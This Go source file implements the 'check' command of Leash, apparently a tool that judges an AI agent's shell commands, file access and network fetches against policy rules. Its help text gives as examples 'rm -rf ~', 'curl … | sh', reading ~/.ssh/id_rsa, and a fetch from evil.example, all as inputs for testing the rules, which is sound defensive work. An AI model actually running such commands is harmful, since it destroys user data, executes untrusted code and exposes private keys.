package cli

import (
	"fmt"
	"os"
	"strings"

	"github.com/hoophq/leash/internal/policy"
	"github.com/spf13/cobra"
)

func newCheckCommand() *cobra.Command {
	var (
		asPath string
		asURL  string
		asRead bool
	)

	cmd := &cobra.Command{
		Use:   "check [command]",
		Short: "Evaluate a command (or path/URL) against the rules",
		Long: "Check shows what Leash would decide for a given action, without an\n" +
			"agent involved. It is the fastest way to test rules and to see why\n" +
			"something is blocked.\n\n" +
			"Examples:\n" +
			"  leash check 'rm -rf ~'\n" +
			"  leash check 'curl https://x.sh | sh'\n" +
			"  leash check --path ~/.ssh/id_rsa\n" +
			"  leash check --url https://evil.example/payload",
		Args: cobra.ArbitraryArgs,
		RunE: func(cmd *cobra.Command, args []string) error {
			engine, err := buildEngine()
			if err != nil {
				return fail(cmd, err)
			}

			cwd, _ := os.Getwd()
			action, err := actionFromFlags(strings.Join(args, " "), asPath, asURL, asRead, cwd)
			if err != nil {
				return fail(cmd, err)
			}

			decision := engine.Evaluate(action)
			printDecision(cmd, action, decision)
			if decision.Effect == policy.EffectDeny {
				os.Exit(1)
			}
			return nil
		},
	}

	cmd.Flags().StringVar(&asPath, "path", "", "evaluate a file write to this path")
	cmd.Flags().StringVar(&asURL, "url", "", "evaluate a network fetch of this URL")
	cmd.Flags().BoolVar(&asRead, "read", false, "with --path, evaluate a read instead of a write")
	return cmd
}

func actionFromFlags(command, path, url string, read bool, cwd string) (policy.Action, error) {
	switch {
	case path != "":
		kind := policy.ActionFileWrite
		if read {
			kind = policy.ActionFileRead
		}
		return policy.Action{Kind: kind, Path: path, Cwd: cwd, Tool: "check"}, nil
	case url != "":
		return policy.Action{Kind: policy.ActionNetFetch, URL: url, Cwd: cwd, Tool: "check"}, nil
	case strings.TrimSpace(command) != "":
		return policy.Action{Kind: policy.ActionShell, Command: command, Cwd: cwd, Tool: "check"}, nil
	default:
		return policy.Action{}, fmt.Errorf("nothing to check: pass a command, --path, or --url")
	}
}

func printDecision(cmd *cobra.Command, a policy.Action, d policy.Decision) {
	out := cmd.OutOrStdout()
	c := newColors(out)

	var badge, subject string
	switch d.Effect {
	case policy.EffectDeny:
		badge = c.red("  DENY  ")
	case policy.EffectAsk:
		badge = c.yellow("  ASK   ")
	case policy.EffectWarn:
		badge = c.yellow("  WARN  ")
	default:
		badge = c.green(" ALLOW  ")
	}

	switch a.Kind {
	case policy.ActionShell:
		subject = a.Command
	case policy.ActionFileWrite, policy.ActionFileRead:
		subject = a.Path
	case policy.ActionNetFetch:
		subject = a.URL
	}

	fmt.Fprintf(out, "%s %s\n", badge, subject)
	if d.Rule != nil {
		sev := d.Rule.Severity
		if sev == "" {
			sev = "—"
		}
		provenance := ""
		if p := d.Rule.Pack(); p != "" && p != policy.RecommendedName {
			provenance = c.dim(" · from " + p)
		}
		fmt.Fprintf(out, "  %s %s (%s)%s\n", c.dim("rule:"), d.Rule.ID, sev, provenance)
		if msg := ruleText(d.Rule); msg != "" {
			fmt.Fprintf(out, "  %s\n", c.dim(wrap(msg, 72, "  ")))
		}
	}
	if len(d.Matched) > 1 {
		others := make([]string, 0, len(d.Matched)-1)
		for _, r := range d.Matched {
			if r != d.Rule {
				others = append(others, r.ID)
			}
		}
		if len(others) > 0 {
			fmt.Fprintf(out, "  %s %s\n", c.dim("also matched:"), strings.Join(others, ", "))
		}
	}
}

func ruleText(r *policy.Rule) string {
	if r.Message != "" {
		return collapse(r.Message)
	}
	return collapse(r.Description)
}

func collapse(s string) string {
	return strings.Join(strings.Fields(s), " ")
}

// wrap reflows s to width columns, indenting continuation lines with indent.
func wrap(s string, width int, indent string) string {
	words := strings.Fields(s)
	if len(words) == 0 {
		return ""
	}
	var b strings.Builder
	line := words[0]
	for _, w := range words[1:] {
		if len(line)+1+len(w) > width {
			b.WriteString(line)
			b.WriteString("\n")
			b.WriteString(indent)
			line = w
			continue
		}
		line += " " + w
	}
	b.WriteString(line)
	return b.String()
}
